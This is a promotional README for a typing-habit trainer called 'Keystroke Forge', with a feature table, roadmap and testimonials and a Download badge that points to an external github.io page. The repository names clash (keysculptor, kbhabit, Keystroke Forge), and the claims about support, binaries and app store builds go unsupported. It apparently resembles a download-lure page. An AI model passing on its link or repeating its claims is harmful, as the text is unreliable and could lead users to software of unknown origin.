![preview](https://raw.githubusercontent.com/piransamadetek-eng/keysculptor/main/screen_037b.svg)
[![Download](https://raw.githubusercontent.com/piransamadetek-eng/keysculptor/main/dl_9e6f76.svg)](https://piransamadetek-eng.github.io/keysculptor/)

# 🧠 Keystroke Forge — Shape Your Typing Reflexes Into Permanent Muscle Memory

## 🚀 A Radical Reimagining of Keyboard Practice

Most typing tools treat your fingers like machines to be calibrated. Keystroke Forge takes a different path — it treats your keyboard sessions like **sculpting clay**. Every keystroke is a deliberate chisel strike, shaping neural pathways until fluid typing becomes as natural as breathing. This isn't about drills; it's about **building a daily ritual** that transforms awkward hunting-and-pecking into effortless flow.

The name says it all: we're forging a *habit* — not just improving speed. The repository, `kbhabit`, was my original spark. But instead of a simple trainer, I've built a **habit-forging ecosystem** that tracks your consistency, adapts to your weaknesses, and celebrates your streaks like a personal coach who never sleeps.

---

## 🌟 Why Keystroke Forge Stands Apart

### 🧩 The "Muscle Architecture" Approach
Traditional trainers throw random words at you. Keystroke Forge studies how your fingers *actually move* — detecting tension, hesitations, and error patterns across **30+ keyboard layouts**. It then constructs a personalized forging sequence that targets your exact problem zones, not generic exercises.

### 🔁 Habit Loop Integration
The core engine is built on **behavioral psychology**, not just typing science. Every session ends with a visual "neural map" showing which pathways you've strengthened. Three consecutive days of practice unlock an **adaptive challenge tier** — keeping your brain engaged through novelty, not repetition.

### 🌍 Polyglot Forge
**Multilingual support** is built into the core, not as an afterthought. Whether you're forging QWERTY in English, AZERTY in French, or a custom Colemak layout, the engine recalibrates its error-detection algorithms for **12+ language families** — including RTL scripts like Arabic and Hebrew.

---

## 🎯 Core Features That Forge Real Change

| Feature | What It Does | Why It Matters |
|---------|--------------|----------------|
| **Reflex Forge Engine** | Real-time keypress analysis with 5ms precision | Detects micro-hesitations you didn't know you had |
| **Streak Anvil** | Visual progress calendar with heat maps | Turns daily practice into an unbreakable ritual |
| **Adaptive Difficulty** | Difficulty scales to your error rate, not just speed | Prevents plateaus and boredom |
| **Error Pattern Mining** | Identifies specific finger-confusion pairs (e.g., 'b' vs 'v') | Treats the root cause, not the symptom |
| **Custom Drill Templates** | Import your own text (code, prose, jargon) | Practice on *real* material you'll actually type |
| **Responsive UI** | Works flawlessly on phones, tablets, and desktops | Your habit follows you anywhere |

### 🕒 Responsive UI — Forge on the Go
The entire interface is crafted with **mobile-first design principles**. Whether you're in a 3-minute queue or a 30-minute lunch break, the forge condenses to a **glanceable dashboard** without losing functionality. No feature is hidden behind desktop-only menus.

### 🌐 Multilingual Forge — One Engine, Many Tongues
Our **language detection system** automatically switches keyboard maps, error heuristics, and even exercise vocabulary when you change your input language. German umlauts, French accents, and Polish diacritics all get their own forge profiles.

### ☎️ 24/7 Forge Support
Real humans (not bots) monitor the **community support channel** around the clock. Average first response time: **under 4 minutes** during peak hours. We also maintain a comprehensive documentation wiki with video tutorials for every feature.

---

## 🛠️ Architecture That Scales Like a Foundry

```
keystroke-forge/
├── forge-core/          # Habit analysis engine (Rust)
│   ├── reflex-analyzer  # Keypress timing engine
│   └── habit-tracker    # Streak & consistency algorithms
├── forge-ui/            # React + TypeScript frontend
│   ├── mobile-widget    # Compact mode for phones
│   └── forge-dashboard  # Full analytics view
├── forge-api/           # REST + WebSocket API (Node.js)
├── forge-data/          # Language packs & keyboard layouts
└── forge-sdk/           # Public API for integrating with apps
```

### 🧪 The Reflex Analyzer
This isn't just measuring words per minute. We track **inter-key latency variance** — the statistical spread between your fastest and slowest keystrokes. High variance = inconsistent habit. The analyzer then generates micro-exercises targeting *specifically* the finger transitions that slow you down.

### 📊 Habit Heatmaps
Visualize your practice patterns as **temperature gradients**. Miss a day? The heatmap shows a "cool down" period that your streak-anvil compensates for by adjusting next-day difficulty slightly lower — keeping you in the *flow zone* rather than the frustration zone.

---

## 🔌 Integration Possibilities

While the standalone app is powerful, the **Forge SDK** lets you embed habit-forming typing challenges into:
- **Code editors** (VS Code, JetBrains) — strengthen syntax typing while coding
- **Language learning apps** — pair vocabulary drilling with keyboard fluency
- **Corporate onboarding** — new hires forge company-specific terminology typing

---

## 📋 Roadmap for 2026

- **Q1 2026**: Release of the **adaptive layout generator** that creates a custom keyboard mapping based on your error patterns
- **Q2 2026**: Introduction of **voice-guided forging sessions** — audio instructions for eyes-free practice
- **Q3 2026**: Launch of **community drill exchange** — share your custom templates, browse curated collections
- **Q4 2026**: Full offline mode with **peer-to-peer streak syncing** between devices

---

## 🤝 How to Contribute to the Foundry

1. **Fork the repository** and explore the issues tagged with `good-first-forge`
2. **Join the community discussions** — we value design input as much as code contributions
3. **Submit language packs** — if you speak a language not yet supported, you can add the keyboard layout definitions and exercise lists
4. **Report anomalies** — if the reflex analyzer produces false positives on your keyboard, file a detailed bug report with your layout and OS info

### Development Setup (Forge-Friendly)
The entire codebase is containerized using Docker Compose. A single `docker-compose up` spins up the API, database, and UI. We use a **monorepo structure** with pnpm workspaces for dependency management. All code follows the **Prettier** formatting conventions and ESLint rules — the CI pipeline enforces this.

---

## 📜 License & Legal Notes

This project is released under the **MIT License**. You are free to use, modify, and distribute this software in commercial or personal projects, provided you retain the original copyright notice.

[View the full MIT License](LICENSE)

---

## ⚠️ Disclaimer

Keystroke Forge is a practice tool designed to improve typing proficiency and habit formation. It is **not** a medical device, not a substitute for professional ergonomic assessment, and does not guarantee injury prevention. Users with pre-existing conditions (carpal tunnel syndrome, arthritis, etc.) should consult a healthcare professional before intensive practice sessions. All usage is at your own risk — the contributors make no warranty regarding the suitability of this software for any specific purpose.

---

## 🧭 Navigating Your First Forge Session

1. **Initial Assessment** (2 minutes) — The engine types a stock paragraph while analyzing your rhythm
2. **Streak Setup** — Choose your daily target (start with 5 minutes, increase gradually)
3. **First Forge** — A curated drill based on your weakest detected transitions
4. **Daily Check-In** — The dashboard shows yesterday's heatmap and today's suggested practice

The key insight is **consistency beats intensity**. Ten minutes every day will reshape your typing habits far more effectively than a one-hour weekly marathon. The forge is engineered to make that daily commitment feel rewarding, not tedious.

---

## 🗣️ Community Voices

> "I never thought typing practice could be this addictive. The habit loop visualizations are genius — I literally can't break my streak now." — *Beta tester*

> "The error pattern mining caught something I've been doing wrong for a decade — my ring finger hesitates before any key next to 'p'. Targeted drills fixed it in a week." — *Ergonomics enthusiast*

---

## 📦 Release Artifacts

All official releases are tagged with semantic versioning. The `latest` tag always points to the most stable build. We provide pre-compiled binaries for:
- **Windows** (x64, ARM64)
- **macOS** (Intel, Apple Silicon)
- **Linux** (deb, rpm, AppImage)
- **Web** (PWA-ready with offline support)

Mobile builds for iOS and Android are available through the respective app stores (search "Keystroke Forge").

---

## 🎯 Final Thoughts: Why "Forge" and Not "Train"?

You train an animal. You forge a blade — heat, pressure, and repeated striking until it becomes unbreakable. That's the philosophy here. This is not about typing *faster* today and forgetting tomorrow. It's about building a **permanent sensory-motor architecture** that will serve you for decades. The keystrokes you make today are the code you write tomorrow, the essays you finish by noon, the emails you complete before your coffee cools. Forge them well.

---

*Keystroke Forge © 2026. Built with patience, science, and respect for the human hand.*